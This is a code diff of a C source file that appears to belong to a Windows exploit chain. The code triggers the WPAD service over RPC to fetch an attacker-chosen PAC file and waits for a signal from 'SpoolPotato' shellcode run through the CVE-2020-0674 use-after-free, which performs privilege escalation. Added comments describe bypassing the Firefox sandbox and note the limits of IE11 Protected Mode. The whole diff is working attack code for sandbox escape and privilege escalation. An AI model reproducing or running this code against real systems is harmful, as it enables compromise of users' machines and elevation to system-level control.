@@ -57,7 +57,7 @@ void DebugLog(const wchar_t* Format, ...) {
     wvsprintfW(pBuffer, Format, Args);
     va_end(Args);
 #ifdef DLL_BUILD
-    MessageBoxW(NULL, pBuffer, L"WPAD escape", 0);
+    MessageBoxW(NULL, pBuffer, L"WPAD escape", 0); // FF sandbox will block this at content level 5-3. 2 and lower works.
 #endif
 #ifdef EXE_BUILD
     printf("%ws\r\n", pBuffer);
@@ -201,67 +201,75 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
     return RpcStatus;
 }
 
-#ifdef DLL_BUILD
-BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
+void WpadSpoolSync(const wchar_t* PacUrl) {
     HANDLE hEvent;
 
-    switch (dwReason) {
-        case DLL_PROCESS_ATTACH: 
-#ifdef SHELLCODE_BUILD
-            /*
-            SpoolPotato/WPAD client synchronization
+    /*
+    SpoolPotato/WPAD client synchronization
 
-            Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
-            the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
-            often yield a successful status from WPAD.
+    Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
+    the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
+    often yield a successful status from WPAD.
 
-            To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
-            attempt to trigger the PAC download until it receives confirmation via an event object from within
-            the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
-            the CVE-2020-0674 UAF.
+    To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
+    attempt to trigger the PAC download until it receives confirmation via an event object from within
+    the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
+    the CVE-2020-0674 UAF.
 
-            The WPAD client initially:
-            1. Creates a sync event file/folder and then proceeds to repeatedly make RPC calls to WPAD in a loop
-            2. Between each iteration of the loop it spends several seconds waiting for the signal file it
-               previously created to be deleted by SpoolPotato.
-            3. Once the event file has been deleted the WPAD client ends its loop and terminates.
+    The WPAD client initially:
+    1. Creates a sync event object in \BaseNamedObjects and then proceeds to repeatedly make RPC calls to
+       WPAD in a loop.
+    2. Between each iteration of the loop it spends several seconds waiting for the signal event it
+       previously created to be signalled by SpoolPotato.
+    3. Once the event has been triggered the WPAD client ends its loop and terminates.
 
-            Meanwhile the SpoolPotato shellcode:
-            1. Makes its privilege escalation operations.
-            2. Waits for the sync event file to be created by the WPAD client.
-            3. Deletes the event file to signal completion to the WPAD client.
-            4. Terminates itself.
-            */
+    Meanwhile the SpoolPotato shellcode:
+    1. Makes its privilege escalation operations.
+    2. Waits for the sync event to be created by the WPAD client.
+    3. Signals the event object to signal completion to the WPAD client.
+    4. Terminates itself.
+    */
 
-            if ((hEvent = CreateEventW(NULL, TRUE, FALSE, SYNC_EVENT_NAME)) != NULL) {
-                if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
-                    DebugLog(L"... successfully set Everyone ACL on event object");
+    if ((hEvent = CreateEventW(NULL, TRUE, FALSE, SYNC_EVENT_NAME)) != NULL) { // Creating event globally bypasses FF sandbox but will not work with IE11 64-bit (Protected Mode) running as Low Integrity. Event will be created to \BaseNamedObjects rather than current session namespace.
+        if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
+            DebugLog(L"... successfully set Everyone ACL on event object");
 
-                    while (TRUE) {
-                        DebugLog(L"... sending PAC update RPC signal to WPAD for %ws...", TARGET_PAC_URL);
-                        RPC_STATUS RpcStatus = WpadInjectPac(TARGET_PAC_URL);
-                        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x. Waiting on event signal...", RpcStatus);
+            while (TRUE) {
+                DebugLog(L"... sending PAC update RPC signal to WPAD for %ws...", PacUrl);
+                RPC_STATUS RpcStatus = WpadInjectPac(PacUrl);
+                DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x. Waiting on event signal...", RpcStatus);
 
-                        if (WaitForSingleObject(hEvent, 2500) == WAIT_OBJECT_0) {
-                            DebugLog(L"... received sync signal from code within WPAD");
-                            break;
-                        }
-                        else {
-                            DebugLog(L"... timed out waiting on sync signal from code within WPAD");
-                        }
-                    }
+                if (WaitForSingleObject(hEvent, 2500) == WAIT_OBJECT_0) {
+                    DebugLog(L"... received sync signal from code within WPAD");
+                    break;
                 }
                 else {
-                    CloseHandle(hEvent);
-                    DebugLog(L"... failed to set Everyone ACL on global event object");
+                    DebugLog(L"... timed out waiting on sync signal from code within WPAD");
                 }
             }
-            else {
-                DebugLog(L"... failed to create sync event");
-            }
+        }
+        else {
+            CloseHandle(hEvent);
+            DebugLog(L"... failed to set Everyone ACL on global event object");
+        }
+    }
+    else {
+        DebugLog(L"... failed to create sync event");
+    }
+}
+
+#ifdef DLL_BUILD
+BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
+#ifdef SHELLCODE_BUILD
+#ifdef SPOOL_SYNC
+    WpadSpoolSync(TARGET_PAC_URL);
 #else
-            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WpadInjectPac, (PVOID)TARGET_PAC_URL, 0, NULL);
+    WpadInjectPac(TARGET_PAC_URL);
 #endif
+#else
+    switch (dwReason) {
+        case DLL_PROCESS_ATTACH: 
+            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WpadInjectPac, (PVOID)TARGET_PAC_URL, 0, NULL);
             break;
         case DLL_THREAD_ATTACH:
             break;
@@ -270,7 +278,7 @@ BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
         case DLL_PROCESS_DETACH:
             break;
     }
-
+#endif
     return TRUE;
 }
 #else
@@ -279,60 +287,10 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
         DebugLog(L"... no PAC URL argument provided");
     }
     else {
-        /*
-        SpoolPotato/WPAD client synchronization
-
-        Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
-        the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
-        often yield a successful status from WPAD.
-
-        To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
-        attempt to trigger the PAC download until it receives confirmation via an event object from within
-        the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
-        the CVE-2020-0674 UAF.
-
-        The WPAD client initially:
-        1. Creates a sync event file/folder and then proceeds to repeatedly make RPC calls to WPAD in a loop
-        2. Between each iteration of the loop it spends several seconds waiting for the signal file it
-           previously created to be deleted by SpoolPotato.
-        3. Once the event file has been deleted the WPAD client ends its loop and terminates.
-
-        Meanwhile the SpoolPotato shellcode:
-        1. Makes its privilege escalation operations.
-        2. Waits for the sync event file to be created by the WPAD client.
-        3. Deletes the event file to signal completion to the WPAD client.
-        4. Terminates itself.
-        */
 #ifdef SPOOL_SYNC
-        HANDLE hEvent;
-
-        if ((hEvent = CreateEventW(NULL, TRUE, FALSE, SYNC_EVENT_NAME)) != NULL) {
-            if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
-                DebugLog(L"... successfully set Everyone ACL on event object");
-
-                while (TRUE) {
-#endif
-                    DebugLog(L"... sending PAC update RPC signal to WPAD...");
-                    RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
-                    DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
-#ifdef SPOOL_SYNC
-                    if(WaitForSingleObject(hEvent, 2500) == WAIT_OBJECT_0) {
-                        DebugLog(L"... received sync signal from code within WPAD");
-                        break;
-                    }
-                    else {
-                        DebugLog(L"... timed out waiting on sync signal from code within WPAD");
-                    }
-                }
-            }
-            else {
-                CloseHandle(hEvent);
-                DebugLog(L"... failed to set Everyone ACL on global event object");
-            }
-        }
-        else {
-            DebugLog(L"... failed to create sync event");
-        }
+        WpadSpoolSync(pArgv[1]);
+#else
+        WpadInjectPac(pArgv[1]);
 #endif
     }
 
